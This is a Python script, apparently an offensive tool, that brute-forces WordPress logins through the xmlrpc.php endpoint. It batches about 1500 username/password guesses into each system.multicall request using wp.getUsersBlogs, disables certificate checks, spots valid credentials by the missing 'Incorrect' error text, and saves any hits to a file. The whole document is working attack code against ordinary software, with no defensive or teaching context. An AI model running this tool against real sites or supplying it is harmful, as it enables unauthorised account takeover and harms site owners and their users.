#!/usr/bin/env python3
import argparse
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from requests.adapters import HTTPAdapter, Retry

def credits():
    print(""" _    _               _                          ______            _        __                        
            | |  | |             | |                         | ___ \          | |      / _|                       
            | |  | | ___  _ __ __| |_ __  _ __ ___  ___ ___  | |_/ /_ __ _   _| |_ ___| |_ ___  _ __ ___ ___ _ __ 
            | |/\| |/ _ \| '__/ _` | '_ \| '__/ _ \/ __/ __| | ___ \ '__| | | | __/ _ \  _/ _ \| '__/ __/ _ \ '__|
            \  /\  / (_) | | | (_| | |_) | | |  __/\__ \__ \ | |_/ / |  | |_| | ||  __/ || (_) | | | (_|  __/ |   
             \/  \/ \___/|_|  \__,_| .__/|_|  \___||___/___/ \____/|_|   \__,_|\__\___|_| \___/|_|  \___\___|_|   
                                   | |                                                                            
                                   |_|                                                                            
             _                                                                                                    
            | |                                                                                                   
            | |__  _   _                                                                                          
            | '_ \| | | |                                                                                         
            | |_) | |_| |                                                                                         
            |_.__/ \__, |                                                                                         
                    __/ |                                                                                         
                   |___/                                                                                          
              __ _____       _____  _____                                                                         
             / _|  _  |     / __  \|  _  |                                                                        
            | |_| |/' |_  __`' / /'| |/' |                                                                        
            |  _|  /| \ \/ /  / /  |  /| |                                                                        
            | | \ |_/ />  < ./ /___\ |_/ /                                                                        
            |_|  \___//_/\_\\_____/ \___/                                                                         
                                                                                                                  
                                                                                                      """)

def check_response(response, credentials_file):
    pwned = False
    password_index = -1
    error_message_en = "Incorrect"
    error_message_es = "Incorrecto"
    messages_counter = 0
    # Last position is methodResponse, no password data
    responses_to_check = response.text.split("</struct>")[:-1]
    while messages_counter < len(responses_to_check) and not pwned:
        individual_response = responses_to_check[messages_counter]
        if not error_message_en in individual_response and not error_message_es in individual_response:
            print("\n###\nResponse:\tPotential valid credentials found!\n##\n")
            print("\tResponse: %s\n##\n" % (individual_response))
            credentials_file.write(("Response:\n%s\n") % (responses_to_check[messages_counter]))
            pwned = True
            password_index = messages_counter
        messages_counter += 1
    return password_index


def bruteforce(target, wordlist_passwords, wordlist_users):
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    session = requests.Session()
    retries = Retry(total=5, backoff_factor=0.2, status_forcelist=[500, 502, 503, 504])
    session.mount(target, HTTPAdapter(max_retries=retries))

    CREDENTIALS_PER_REQUEST = 1500
    RESULTS_FILE = open("XMLRPC_bruteforcer_results.txt", "w")
    PAYLOAD_STARTING = """<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>"""
    PAYLOAD_END = """</data></array></value></param></params></methodCall>"""
    url = "%s/xmlrpc.php" % target
    credentials_found = False
    all_passwords_processed = False
    users = open(wordlist_users, "r")
    for org_user in users:
        while not credentials_found and not all_passwords_processed:
            user = str(org_user).rstrip()
            print("[-]Testing user %s" % user)
            main_payload = ""
            credentials_counter = 0
            tested_credentials = []
            passwords = open(wordlist_passwords, "r")
            for org_password in passwords:
                password = str(org_password).rstrip()
                current_credentials = (user, password)
                main_payload += """<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>
                                        params</name><value><array><data><value><array><data><value><string>%s</string></value><value><string>%s</string></value></data>
                                        </array></value></data></array></value></member></struct></value>""" \
                                % (user, password)
                tested_credentials.append(current_credentials)
                credentials_counter += 1
                if credentials_counter % CREDENTIALS_PER_REQUEST == 0:
                    print("[-] Testing %s credentials in request - %s total tried" % (CREDENTIALS_PER_REQUEST, credentials_counter))
                    payload = PAYLOAD_STARTING + main_payload + PAYLOAD_END
                    request = session.post(url, data=payload, verify=False)
                    main_payload = ""
                    cred_index = check_response(request, RESULTS_FILE)
                    if cred_index > -1:
                        credentials_found = True
                        print("\t\tCredentials: %s" % ("-".join(tested_credentials[cred_index])))
                        RESULTS_FILE.write(
                            "\t########\n\t\tCredentials: %s\n" % ("-".join(tested_credentials[cred_index])))
                    else:
                        print("\tNo credentials found in response")

            # Check remaining credentials before trying another user
            if main_payload != "":
                print("[-] Testing %s credentials in request - %s total tried" % (CREDENTIALS_PER_REQUEST, credentials_counter))
                payload = PAYLOAD_STARTING + main_payload + PAYLOAD_END
                request = session.post(url, data=payload, verify=False)
                cred_index = check_response(request, RESULTS_FILE)
                if cred_index > -1:
                    print("\t\tCredentials: %s" % ("-".join(tested_credentials[cred_index])))
                    RESULTS_FILE.write("\t########\n\t\tCredentials: %s\n" % ("-".join(tested_credentials[cred_index])))
                else:
                    print("No credentials found in response")
            all_passwords_processed = True

    RESULTS_FILE.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Wordpress xml_rpc.php bruteforcer")
    parser.add_argument("-t", "--target_url", type=str, required=True)
    parser.add_argument("-p", "--passwords_dic", type=str, required=True)
    parser.add_argument("-u", "--users_dic", type=str, required=True)
    args = parser.parse_args()
    credits()
    bruteforce(args.target_url, args.passwords_dic, args.users_dic)
